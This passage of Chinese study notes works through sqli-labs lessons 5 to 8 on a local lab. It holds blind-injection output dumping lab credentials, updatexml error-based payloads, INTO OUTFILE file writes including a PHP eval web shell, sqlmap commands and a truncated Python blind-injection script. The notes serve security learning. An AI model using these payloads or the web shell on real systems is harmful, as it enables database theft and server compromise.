angeli<br>[+] 获取第 7 个字符…<br>[+] 当前结果: angelin<br>[+] 获取第 8 个字符…<br>[+] 当前结果: angelina<br>[+] 数据[2]: angelina<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: du<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dum<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dumm<br>[+] 获取第 5 个字符…<br>[+] 当前结果: dummy<br>[+] 数据[3]: dummy<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: se<br>[+] 获取第 3 个字符…<br>[+] 当前结果: sec<br>[+] 获取第 4 个字符…<br>[+] 当前结果: secu<br>[+] 获取第 5 个字符…<br>[+] 当前结果: secur<br>[+] 获取第 6 个字符…<br>[+] 当前结果: secure<br>[+] 数据[4]: secure<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: st<br>[+] 获取第 3 个字符…<br>[+] 当前结果: stu<br>[+] 获取第 4 个字符…<br>[+] 当前结果: stup<br>[+] 获取第 5 个字符…<br>[+] 当前结果: stupi<br>[+] 获取第 6 个字符…<br>[+] 当前结果: stupid<br>[+] 数据[5]: stupid<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: su<br>[+] 获取第 3 个字符…<br>[+] 当前结果: sup<br>[+] 获取第 4 个字符…<br>[+] 当前结果: supe<br>[+] 获取第 5 个字符…<br>[+] 当前结果: super<br>[+] 获取第 6 个字符…<br>[+] 当前结果: superm<br>[+] 获取第 7 个字符…<br>[+] 当前结果: superma<br>[+] 获取第 8 个字符…<br>[+] 当前结果: superman<br>[+] 数据[6]: superman<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: b<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ba<br>[+] 获取第 3 个字符…<br>[+] 当前结果: bat<br>[+] 获取第 4 个字符…<br>[+] 当前结果: batm<br>[+] 获取第 5 个字符…<br>[+] 当前结果: batma<br>[+] 获取第 6 个字符…<br>[+] 当前结果: batman<br>[+] 数据[7]: batman<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 数据[8]: admin<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin1<br>[+] 数据[9]: admin1<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin2<br>[+] 数据[10]: admin2<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin3<br>[+] 数据[11]: admin3<br>[+] 长度为: 7<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: dh<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dha<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dhak<br>[+] 获取第 5 个字符…<br>[+] 当前结果: dhakk<br>[+] 获取第 6 个字符…<br>[+] 当前结果: dhakka<br>[+] 获取第 7 个字符…<br>[+] 当前结果: dhakkan<br>[+] 数据[12]: dhakkan<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin4<br>[+] 数据[13]: admin4<br>[+] 获取字段: password<br>[+] 数据条数: 13<br>[+] 长度为: 4<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: du<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dum<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dumb<br>[+] 数据[1]: dumb<br>[+] 长度为: 10<br>[+] 获取第 1 个字符…<br>[+] 当前结果: i<br>[+] 获取第 2 个字符…<br>[+] 当前结果: i-<br>[+] 获取第 3 个字符…<br>[+] 当前结果: i-k<br>[+] 获取第 4 个字符…<br>[+] 当前结果: i-ki<br>[+] 获取第 5 个字符…<br>[+] 当前结果: i-kil<br>[+] 获取第 6 个字符…<br>[+] 当前结果: i-kill<br>[+] 获取第 7 个字符…<br>[+] 当前结果: i-kill-<br>[+] 获取第 8 个字符…<br>[+] 当前结果: i-kill-y<br>[+] 获取第 9 个字符…<br>[+] 当前结果: i-kill-yo<br>[+] 获取第 10 个字符…<br>[+] 当前结果: i-kill-you<br>[+] 数据[2]: i-kill-you<br>[+] 长度为: 8<br>[+] 获取第 1 个字符…<br>[+] 当前结果: p<br>[+] 获取第 2 个字符…<br>[+] 当前结果: p@<br>[+] 获取第 3 个字符…<br>[+] 当前结果: p@s<br>[+] 获取第 4 个字符…<br>[+] 当前结果: p@ss<br>[+] 获取第 5 个字符…<br>[+] 当前结果: p@ssw<br>[+] 获取第 6 个字符…<br>[+] 当前结果: p@sswo<br>[+] 获取第 7 个字符…<br>[+] 当前结果: p@sswor<br>[+] 获取第 8 个字符…<br>[+] 当前结果: p@ssword<br>[+] 数据[3]: p@ssword<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: c<br>[+] 获取第 2 个字符…<br>[+] 当前结果: cr<br>[+] 获取第 3 个字符…<br>[+] 当前结果: cra<br>[+] 获取第 4 个字符…<br>[+] 当前结果: crap<br>[+] 获取第 5 个字符…<br>[+] 当前结果: crapp<br>[+] 获取第 6 个字符…<br>[+] 当前结果: crappy<br>[+] 数据[4]: crappy<br>[+] 长度为: 9<br>[+] 获取第 1 个字符…<br>[+] 当前结果: s<br>[+] 获取第 2 个字符…<br>[+] 当前结果: st<br>[+] 获取第 3 个字符…<br>[+] 当前结果: stu<br>[+] 获取第 4 个字符…<br>[+] 当前结果: stup<br>[+] 获取第 5 个字符…<br>[+] 当前结果: stupi<br>[+] 获取第 6 个字符…<br>[+] 当前结果: stupid<br>[+] 获取第 7 个字符…<br>[+] 当前结果: stupidi<br>[+] 获取第 8 个字符…<br>[+] 当前结果: stupidit<br>[+] 获取第 9 个字符…<br>[+] 当前结果: stupidity<br>[+] 数据[5]: stupidity<br>[+] 长度为: 7<br>[+] 获取第 1 个字符…<br>[+] 当前结果: g<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ge<br>[+] 获取第 3 个字符…<br>[+] 当前结果: gen<br>[+] 获取第 4 个字符…<br>[+] 当前结果: geni<br>[+] 获取第 5 个字符…<br>[+] 当前结果: genio<br>[+] 获取第 6 个字符…<br>[+] 当前结果: geniou<br>[+] 获取第 7 个字符…<br>[+] 当前结果: genious<br>[+] 数据[6]: genious<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: m<br>[+] 获取第 2 个字符…<br>[+] 当前结果: mo<br>[+] 获取第 3 个字符…<br>[+] 当前结果: mob<br>[+] 获取第 4 个字符…<br>[+] 当前结果: mob!<br>[+] 获取第 5 个字符…<br>[+] 当前结果: mob!l<br>[+] 获取第 6 个字符…<br>[+] 当前结果: mob!le<br>[+] 数据[7]: mob!le<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 数据[8]: admin<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin1<br>[+] 数据[9]: admin1<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin2<br>[+] 数据[10]: admin2<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin3<br>[+] 数据[11]: admin3<br>[+] 长度为: 5<br>[+] 获取第 1 个字符…<br>[+] 当前结果: d<br>[+] 获取第 2 个字符…<br>[+] 当前结果: du<br>[+] 获取第 3 个字符…<br>[+] 当前结果: dum<br>[+] 获取第 4 个字符…<br>[+] 当前结果: dumb<br>[+] 获取第 5 个字符…<br>[+] 当前结果: dumbo<br>[+] 数据[12]: dumbo<br>[+] 长度为: 6<br>[+] 获取第 1 个字符…<br>[+] 当前结果: a<br>[+] 获取第 2 个字符…<br>[+] 当前结果: ad<br>[+] 获取第 3 个字符…<br>[+] 当前结果: adm<br>[+] 获取第 4 个字符…<br>[+] 当前结果: admi<br>[+] 获取第 5 个字符…<br>[+] 当前结果: admin<br>[+] 获取第 6 个字符…<br>[+] 当前结果: admin4<br>[+] 数据[13]: admin4</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">### bp盲注爆破<br>csdn上看到可以直接不用写脚本直接用bp看返回长度来爆破的  <br>看来也可以不用<span class="hljs-keyword">if</span>函数来构造payload<br></code></pre></td></tr></table></figure><p>?id&#x3D;1’and substr(database(),1,1) &#x3D;’s’–+</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">能达到同样效果<br><br>bp爆破的话payload设置的前后和循序有点难搞，但是原理知道了可以一次一次慢慢试；<br><br>## <span class="hljs-type">xml</span>报错注入<br><br>前提是在有<span class="hljs-keyword">sql</span>报错信息输出的前提下（存在print_r(mysql_error())函数）<br><br>在高版本MySQL（<span class="hljs-number">5.1</span>）中添加了对<span class="hljs-type">xml</span>文档进行查询和修改的函数<br><br><span class="hljs-keyword">update</span>函数：<br></code></pre></td></tr></table></figure><p>UPDATEXML(xml_target, xpath_expr, new_xml)</p><p>xml_target：要更新的XML文档。<br>xpath_expr：XPath表达式，用于定位需要更新的节点。<br>new_xml：新的XML片段或值，用于替换目标节点的值。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">extractvalue</span>函数：<br></code></pre></td></tr></table></figure><p>EXTRACTVALUE(xml_target, xpath_expr)</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">原理是用<span class="hljs-keyword">xpath</span>的非法字符报错<br>KIMI：<br>&gt;updatexml()和extractvalue()函数在处理XML数据时，会使用<span class="hljs-keyword">XPath</span>表达式来定位或提取节点。如果<span class="hljs-keyword">XPath</span>表达式不符合语法规范，MySQL会返回错误信息。攻击者可以利用这一特性，通过拼接恶意的<span class="hljs-keyword">XPath</span>表达式，使数据库报错，并在错误信息中泄露敏感数据。  <br><br>流程：  <br><br><span class="hljs-number">1</span>.判断闭合点  <br><span class="hljs-number">2</span>.判断是否存在xml报错注入：  <br>使用**updatexml**<br></code></pre></td></tr></table></figure><p>?id&#x3D;1’ and updatexml(1,0x7e,1) –+<br>0x7e 是 ~ 的16进制表示，用来进行绕过，字符串替换成十六进制数有一定的绕过作用</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">成功回显<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-variable constant_">XPATH</span> syntax <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;~&#x27;</span>  </span><br><br>说明存在报错注入<br><br></code></pre></td></tr></table></figure><p>?id&#x3D;1’ and updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1) –+</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&gt;爆库名<br><br><span class="hljs-strong">***note**</span>* <br><br>concat和group<span class="hljs-emphasis">_concat有什么区别,问了kimi，  </span><br><span class="hljs-emphasis">***我总结就是concat用来拼接字符串，group_</span>concat用来拼接表中的内容<span class="hljs-strong">***</span><br><br>然后就是走注入流程  <br><br>爆表名<br></code></pre></td></tr></table></figure><p>?id&#x3D;1’and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database()),0x7e),1)–+</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">&gt;XPATH syntax <span class="hljs-type">error</span>: <span class="hljs-string">&#x27;~emails,referers,uagents,users~&#x27;</span>  <br><br>爆字段<br></code></pre></td></tr></table></figure><p>?id&#x3D;1’and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’),0x7e),1)–+</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&gt;XPATH syntax <span class="hljs-keyword">error</span>: &#x27;~<span class="hljs-built_in">id</span>,username,password~&#x27;<br><br>爆表<br></code></pre></td></tr></table></figure><p><a href="http://localhost:32768/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20group_concat(id,username,password)from%20users),0x7e),1)--+">http://localhost:32768/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20group_concat(id,username,password)from%20users),0x7e),1)--+</a></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">&gt;<span class="hljs-keyword">XPATH</span> syntax error: &#x27;~<span class="hljs-number">1</span>DumbDumb,<span class="hljs-number">2</span>AngelinaI-kill-you,<span class="hljs-number">3</span>&#x27;  <br><br>发现回显不完全，听说<span class="hljs-keyword">xpath</span>报错有长度限制，改为：<br></code></pre></td></tr></table></figure><p>?id&#x3D;1’and updatexml(1,concat(0x7e,(select group_concat(id,username,password)from users limit 0,1),0x7e),1)–+</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">发现<span class="hljs-built_in">limit</span>的值改变了依然没结果，看了眼csdn，发现group_concat要改为<span class="hljs-built_in">concat</span>，  <br>问了kimi，<span class="hljs-built_in">limit</span>是限制输出的行在哪，如(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)就会限制为从第一行开始提取一列，但是用group_concat，会将一整个表整合为一行，限制就没用了。<br><br>最后payload改为<br></code></pre></td></tr></table></figure><p>?id&#x3D;1’and updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1)–+</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>成功，只要一条条爆出<span class="hljs-built_in">users</span>表中内容就行了。<br><br></code></pre></td></tr></table></figure><h1 id="sql-labs-less6"><a href="#sql-labs-less6" class="headerlink" title="sql-labs less6"></a>sql-labs less6</h1><p>和less5原理一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$get_id</span>&quot;</span><br></code></pre></td></tr></table></figure><p>闭合payload改为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;<br></code></pre></td></tr></table></figure><p>即可</p><hr><h2 id="title-note-04date-2025-03-02-16-20-58tags-sql-labs"><a href="#title-note-04date-2025-03-02-16-20-58tags-sql-labs" class="headerlink" title="title: note-04date: 2025-03-02 16:20:58tags: sql-labs"></a>title: note-04<br>date: 2025-03-02 16:20:58<br>tags: sql-labs</h2><h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>需要先设置mysql的文件读写权限：  </p><blockquote><p>Windows的配置文件在mysql下的my.ini<br>Linux的配置文件在&#x2F;etc&#x2F;conf  </p></blockquote><p>怎么找也找不到，最后问了卡密，在&#x2F;etc&#x2F;mysql中找到了；<br>但是还是没法写马；<br>docker环境现在还没搞懂，以后有机会再在其它环境下再部署sql-labs试试；</p><h2 id="看网上的解法写点笔记："><a href="#看网上的解法写点笔记：" class="headerlink" title="看网上的解法写点笔记："></a>看网上的解法写点笔记：</h2><p>先判断注入类型，没有sql错误回显的情况就不断猜测闭合语句，能正确闭合不报错就表示闭合成功  </p><p>因为用 ‘ 打破’’闭合但是没用猜对全部闭合的话会一直提示sql语法错误，能完成闭合并且并且不报错就为完全猜对。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>然后用联合查询<br>select搭配into outfile能写入数据<br>大概是select能查询数据，into outfile能写入数据<br>union select 1,user(),database() into outfile “路径”<br>能写入：<br>1，当前用户，数据库名称</p><blockquote><p>url 中反斜杠\会被当作转义字符处理所以要用两个反斜杠来传入</p></blockquote><p>写马</p><blockquote><p>?id&#x3D;1’)) union select 1,2,’<?php @eval($_POST["mima"])?>‘ into outfile “C:\phpStudy\WWW\sqli\Less-7\test.php” – #  </p></blockquote><p>这里的路径不是我的环境<br>现在才知道原来$_GET和POST必须大写…..<br>最后连马就行</p><h2 id="另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果"><a href="#另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果" class="headerlink" title="另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果"></a>另一种解法，用写文件的权限在服务的less7题目目录写txt访问爆库结果</h2><blockquote><p>在sql中能用‘@@datadir’ 返回数据库的绝对路径，随后猜测网站的绝对路径  </p></blockquote><p>将查询到的当前用户和数据库名称写入到题目目录下的1.txt随后访问就能看到查询结果</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">database</span>(), <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\1.txt&quot;</span> --+<br></code></pre></td></tr></table></figure><p>然后就是标准操作</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=&#x27;security&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\2.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>我想，因为不用担心回显界面问题所以也可以不用group_concat,union等，前面两个的查询也是一样</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=&#x27;security&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\3.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=&#x27;users&#x27; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\4.txt&quot;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>其实我看没有了回显页面的限制，不用爆字段也行，直接爆表就得：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27;)) select * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;题目目录\\5.txt&quot;</span> <span class="hljs-comment">--+ </span><br></code></pre></td></tr></table></figure><blockquote><p>这里写入文件的时候，需要注意的是利用数据库file权限向操作系统写入文件时，对于相同文件名的文件不能覆盖，所以如果第一次上传1.txt，下次再上传1.txt，就是无效命令了，也就是新的1.txt中的内容并不会覆盖之前的1.txt</p></blockquote><p><a href="https://blog.csdn.net/m0_46315342/article/details/106557552">https://blog.csdn.net/m0_46315342/article/details/106557552</a></p><hr><h2 id="title-note-05date-2025-03-04-21-17-54tags-sql-labs"><a href="#title-note-05date-2025-03-04-21-17-54tags-sql-labs" class="headerlink" title="title: note-05date: 2025-03-04 21:17:54tags: sql-labs"></a>title: note-05<br>date: 2025-03-04 21:17:54<br>tags: sql-labs</h2><h1 id="修正sql-labs-less7错误"><a href="#修正sql-labs-less7错误" class="headerlink" title="修正sql-labs-less7错误"></a>修正sql-labs-less7错误</h1><p>实现了win下phpstudy部署sqli，自己做了一遍less7，发现了select和union select的问题，<br>上次我以为有了文件写入后不需要union了，后来发现并不是这样，没了union会失败<br>问了kimi  </p><blockquote><p>为什么<br>?id&#x3D;-1’)) union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’security’ into outfile”D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txt”–+<br>而<br>?id&#x3D;-1’)) select table_name from information_schema.tables where table_schema&#x3D;’security’ into outfile”D:\phpstudy_pro\WWW\sqli-labs\Less-7\4.txt”–+<br>不生效  </p></blockquote><p>KIMI:</p><blockquote><p><em><strong>为什么UNION SELECT是关键？</strong></em><br>UNION SELECT的作用是把两个查询的结果合并在一起，而不是直接替换原始查询。它要求两个查询的列数和数据类型匹配，但只要满足这些条件，就能让注入的语句与原始查询兼容。而直接的SELECT语句没有这种兼容性，直接破坏了原始查询的结构，导致语法错误。<br><em><strong>数据库的执行逻辑决定了这一切</strong></em><br>数据库在解析SQL语句时，会严格按照语法规则执行。如果注入的语句破坏了原始查询的结构，数据库会报错。这种报错可能不会直接显示给用户，但会导致注入失败。第一个语句通过UNION SELECT与原始查询兼容，所以能成功；第二个语句直接破坏了原始查询的语法，所以失败。<br><em><strong>权限和路径不是问题</strong></em><br>INTO OUTFILE操作需要数据库户具有FILE权限，而且目标路径必须有效。但既然第一个语句已经成功，说明权限和路径都没有问题。第二个语句失败的原因完全在于语法错误，而不是权限或路径。  </p></blockquote><p>原来联合注入漏洞叫<em><strong>联合</strong></em>是这个原理</p><h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>该题测试没有报错回显，只有登录是否成功回显<br>只能用盲注了，<br>sqlmap或上次less5的脚本都行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqlmap">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; --batch --dbs<br><br>--batch表示碰到选择时选用默认选项，--dbs表示爬取所有数据库名<br>-D  库名 --tables表示爬取某数据库下的所有表<br>-D 库名 -T 表名--columns表示爬取某库下某表的所有列<br></code></pre></td></tr></table></figure><p>less5脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>TARGET_URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-8/&quot;</span> <br>TRUE_STRING = <span class="hljs-string">&quot;You are in...........&quot;</span> <br>CHARSET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@$!&quot;</span> <br>HEADERS = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot;</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">payload</span>):<br>    url = <span 